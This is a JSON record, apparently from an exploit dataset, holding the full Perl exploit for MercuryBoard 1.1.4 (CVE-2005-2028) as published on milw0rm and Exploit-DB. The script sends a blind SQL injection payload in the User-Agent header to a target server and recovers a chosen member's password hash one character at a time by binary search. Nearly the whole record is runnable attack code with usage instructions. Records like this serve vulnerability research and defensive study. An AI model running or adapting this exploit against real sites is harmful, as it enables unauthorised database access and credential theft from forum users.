{
  "id": "1058",
  "title": "MercuryBoard 1.1.4 - SQL Injection",
  "cve": "CVE-2005-2028",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n### MercuryBoard <=1.1.4, MySQL => 4.1 sql injection exploit by RST/GHC\r\n### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n### * note: you need first register on forum for get id and login\r\n### after what logout from forum and run exploit\r\n### * note2: edit timestamp in sources if exploit not work ;)\r\n### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n### (c)oded by 1dt.w0lf\r\n### RST/GHC - http://rst.void.ru , http://ghc.ru\r\n### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nuse IO::Socket;\r\nuse Getopt::Std;\r\n\r\ngetopts('h:f:b:i:l:p:');\r\n\r\n$server    = $opt_h;\r\n$path      = $opt_f;\r\n$member_id = $opt_b;\r\n$hacker_id = $opt_i;\r\n$hacker_l  = $opt_l;\r\n$prefix    = $opt_p || 'mb_' ;\r\n\r\nif(!$server||!$path||!$member_id||!$hacker_id||!$hacker_l) { &usage; }\r\n\r\n$server =~ s!(http:\\/\\/)!!;\r\n\r\n$request  = 'http://';\r\n$request .= $server;\r\n$request .= $path;\r\n\r\n$s_num = 1;\r\n$|++;\r\n$n = 0;\r\n&head;\r\nprint \"\\r\\n\";\r\nprint \" [~]      SERVER  : $server\\r\\n\";\r\nprint \" [~]  FORUM PATH  : $path\\r\\n\";\r\nprint \" [~] ID FOR BRUTE : $member_id\\r\\n\";\r\nprint \" [~]    HACKER ID : $hacker_id\\r\\n\";\r\nprint \" [~] HACKER LOGIN : $hacker_l\\r\\n\";\r\nprint \" [~] TABLE PREFIX : $prefix\\r\\n\\r\\n\";\r\nprint \" [~] SEARCHING PASSWORD ... [|]\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,103); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n if(length($allchar) > 0){\r\n print qq{\\b\\b DONE ] \r\n \r\n -------------------------------------------------------------------\r\n USER ID : $member_id\r\n    HASH : $allchar\r\n -------------------------------------------------------------------\r\n };\r\n }\r\n else\r\n {\r\n print \"\\b\\b FAILED ]\";\r\n }\r\n exit();  \r\n }\r\nelse \r\n {  \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \"/**/BETWEEN/**/$r/**/AND/**/$fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n status();\r\n $ccheck = $_[0]; \r\n \r\n $user_agent2 = \"666',''),($hacker_id, 'board', 0, (SELECT/**/if((ascii(substring((SELECT/**/user_password/**/FROM/**/${prefix}users/**/WHERE/**/user_id=$member_id),$s_num,1)))$ccheck,1119336207,0)), '666.666.666.666', '666', '666')/*\";\r\n\r\n $sock2 = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\");\r\n printf $sock2 (\"GET %s?a=active HTTP/1.0\\nHost: %s\\nUser-Agent: %s\\nAccept: */*\\nConnection: close\\n\\n\",\r\n $request,$server,$user_agent2);\r\n \r\n while(<$sock2>) \r\n  {   \r\n  #print $_;\r\n  if (/w=$hacker_id\"\\>$hacker_l/) { return 1; }\r\n  } \r\n\r\n return 0;\r\n }\r\n \r\nsub status()\r\n{\r\n  $status = $n % 5;\r\n  if($status==0){ print \"\\b\\b/]\";  }\r\n  if($status==1){ print \"\\b\\b-]\";  }\r\n  if($status==2){ print \"\\b\\b\\\\]\"; }\r\n  if($status==3){ print \"\\b\\b|]\";  }\r\n}\r\n\r\nsub usage()\r\n {\r\n &head;\r\n print q(\r\n USAGE\r\n    r57mercury.pl [OPTIONS]\r\n  \r\n OPTIONS\r\n  -h [host]     ~ host where mercury board installed\r\n  -f [/folder/] ~ folder where mercury board installed\r\n  -b [user_id]  ~ user id for bruteforce\r\n  -i [id]       ~ hacker id (hacker must be register on forum)\r\n  -l [login]    ~ hacker login on forum\r\n  -p [prefix]   ~ database tables prefix (optional)\r\n                  default is \"mb\"\r\n E.G.\r\n  r57mercury.pl -h www.blah.com -f /mercuryboard/ -b 2 -i 3 -l lamer\r\n -------------------------------------------------------------------\r\n (c)oded by 1dt.w0lf\r\n RST/GHC , http://rst.void.ru , http://ghc.ru\r\n );\r\n exit();\r\n }\r\nsub head()\r\n {\r\n print q(\r\n -------------------------------------------------------------------\r\n MercuryBoard <=1.1.4, MySQL => 4.1 sql injection exploit by RST/GHC\r\n -------------------------------------------------------------------\r\n );\r\n }\r\n\r\n# milw0rm.com [2005-06-21]",
  "url": "https://www.exploit-db.com/exploits/1058"
}